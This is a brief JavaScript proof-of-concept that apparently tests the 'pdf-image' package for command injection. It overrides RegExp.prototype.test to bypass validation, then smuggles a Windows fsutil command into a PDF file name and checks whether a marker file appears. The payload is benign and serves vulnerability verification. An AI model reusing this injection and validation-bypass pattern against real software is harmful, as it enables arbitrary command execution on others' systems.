RegExp.prototype.test = () => true;
const PDFImage = require('pdf-image').PDFImage;
const fs = require('fs');
const path = './pdf-image';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let pdfImage = new PDFImage('asd.pdf" & fsutil file createnew pdf-image 0"');
try {
    console.log(pdfImage.numberOfPages().then(function (imagePath) {
        file_exist = fs.existsSync(path);
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    }));
} catch (e) {
}